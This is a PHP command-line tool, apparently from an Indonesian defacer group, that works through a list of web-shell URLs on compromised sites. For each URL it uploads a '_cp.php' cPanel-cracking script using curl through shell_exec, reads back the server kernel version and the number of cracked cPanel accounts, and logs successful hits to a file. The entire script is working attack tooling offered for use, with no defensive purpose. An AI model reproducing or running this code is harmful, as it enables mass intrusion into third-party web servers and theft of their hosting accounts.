<?php
// coded by ustadcage_48 and Html404//
error_reporting(0);
## log save ##
function sv($site,$ext){
$fp = fopen("$ext.txt", 'a');
fwrite($fp, "$site\n");
fclose($fp);
}
## color ##
function wr($cl,$st){
	$cc .= "\033[" . $cl . "m";
	$cc .=  $st . "\033[0m";
	return $cc;
}
echo wr("0;31"," ___            _                ,
/ (_)          | |      o       /|   / o
\__         _  | |  __    _|_    |__/    _|_  __,
/    /\/  |/ \_|/  /  \_|  |-----| \   |  |  /  |
\___/ /\_/|__/ |__/\__/ |_/|_/   |  \_/|_/|_/\_/|_/
         /|
         \| Sharing [IT] Exploit\n\n");

sleep(2);
print wr("0;33","[+] Cpanel Checker\n");
sleep(2);
print wr("0;33","[+] Opening Tools ...\n");
sleep(1);
print wr("0;33","[+] Please Wait ...\n\n");
sleep(2);
$baca = explode("\r\n",file_get_contents($argv[1]));
// pecah
  foreach($baca as $shell){
  	echo "[$] ".wr("0;33","$shell\n");
    	shell_exec('curl -s -F "file=@_cp.php" '.$shell);
    	// parse
$parse = parse_url($shell);
$pattern = '~\w+\.php~';
$parse = preg_replace($pattern, '', $parse);
$url = $parse['scheme'].'://'.$parse['host'].$parse['path'];
    	// cek dolo
    if(preg_match('/CPANEL/',file_get_contents($url."_cp.php"))){
    	preg_match('/"kernel":"(.*?)",/',file_get_contents($url."_cp.php"),$asu);
    	
    	echo "[$] ".wr("0;32","cPanel Finder Successfully Uploaded\n");;
    	echo "[$] ".wr("0;33","Kernel")." -> ".wr("0;32",$asu[1]."\n");
    	echo "[$] ".wr("0;34","Checking Cpanel ...\n");;
    	sleep(2);
    	if(preg_match('/"total":"(.*?)"/',shell_exec('curl -s '.$url.'_cp.php'),$cp)){
    	echo "[$] ".wr("0;33","Cpanel")." -> (".wr("0;35",$cp[1]).")".wr("0;32"," Successfully Crack\n\n");
    	sv('http://'.$parse["host"].'/_cp.php',"tools_cp");
    	}
    	if(preg_match('/Not Accessible!/',shell_exec('curl -s '.$url.'_cp.php'))){
    	echo "[$] ".wr("0;31","Not Accessible!\n\n");
    	}
    }
     else {
    	echo "[$] ".wr("0;31","Cpanell Tools Not Uploaded !!\n\n");
    }}
    